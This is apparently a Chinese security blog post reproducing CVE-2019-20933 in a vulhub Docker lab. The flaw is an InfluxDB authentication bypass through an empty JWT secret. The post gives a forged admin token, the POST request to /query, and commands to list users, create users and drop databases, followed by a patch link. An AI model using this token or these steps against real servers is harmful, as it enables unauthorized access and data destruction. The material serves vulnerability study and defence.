#  InfluxDB JWT未授权漏洞   
BMCel  巢安实验室   2024-10-26 16:30  
  
#### 0x00 漏洞简介  
  
InfluxDB是一款时序数据库，其使用JWT作为鉴权方式。在其1.7.6版本以前，默认设置JWT的认证密钥shared-secret为空字符串，导致攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。  
  
漏洞原理是1.7.6之前的InfluxDB在services/httpd/handler.go中的身份验证函数中存在身份验证绕过漏洞，因为JWT令牌可能具有空的共享密钥（也被称为共享密钥）。  
#### 0x01 环境启动  
```
cd /root/vulhub-master/influxdb/CVE-2019-20933/
docker-compose build
docker-compose up -d

```  
#### 0x02 漏洞复现  
  
**访问htp://IP:8086/query 查询功能有提示需要登录**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxvKBicviaicZdUjDy95b0w45EmhwDuZt5eS6Pmvp6AicZ7zouJibqFPaTOw6S13sjcev8txGupQN9Rmuw/640?wx_fmt=png&from=appmsg "")  
  
**抓包发现响应头带有X-Influxdb-Version标志头**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxvKBicviaicZdUjDy95b0w45EuuzLeGgjpKsAMPraIB4b3C6ycdnneU5ofBJuiaCRJzmoW4VSus7VdTA/640?wx_fmt=png&from=appmsg "")  
  
  
**访问htp://IP:8086/debug/vars 查看系统的服务信息**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxvKBicviaicZdUjDy95b0w45EDQpwFDTLqEapa1RRfVWamH7AO2qVKIoxDy219qBxxg95PSFdjO8Ycw/640?wx_fmt=png&from=appmsg "")  
  
  
**通过https://jwt.io/#debugger-io 构造绕过身份验证所需的Token:**  
  
```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "admin",
  "exp": 4072615314
}

```  
  
  
其中，username代表已存在的用户，exp是时间戳，代表该Token的过期时间，所以需要生成一个未来的时间戳（www.beijing-time.org/shijianchuo/），将secret值置空，得到编码后的Token：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxvKBicviaicZdUjDy95b0w45E5kbFu6icWzSjZGKDoa4cufFvcSrq1LsXibRaaQPW49hpHzjPpC4g29Lg/640?wx_fmt=png&from=appmsg "")  
  
  
**抓取/query页面的数据包，将请求方式修改为POST，添加以下请求字段：**  
  
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MDcyNjE1MzE0fQ.mwI2P1j8CIvhxBKFvcyU7TNLBeuFtiUM1mPrKanF1w4

Content-Type: application/x-www-form-urlencoded

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVxvKBicviaicZdUjDy95b0w45EyE2JovMvMjTWdGjGvrwEsr6nEfm31nf7PiaqWzUeOrQ7YktFN9LgiazQ/640?wx_fmt=png&from=appmsg "")  
##### 相关操作命令如下：  
```
show databases	#显示数据库
show measurements		#显示当前数据库中的数据表
show users	#显示用户
create database aaa		#创建aaa数据库
drop database aaa		#删除aaa数据库
show field keys		#显示当前数据中的表的字段
create user aaa with password 'aaa'	#创建aaa:aaa 数据库用户	

```  
  
#### 0x03 修复建议  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://github.com/influxdata/influxdb/commit/761b557315ff9c1642cf3b0e5797cd3d983a24c0  
  
  
真心感觉自己要学习的知识好多，也有好多大神卧虎藏龙、开源分享。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。  
  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
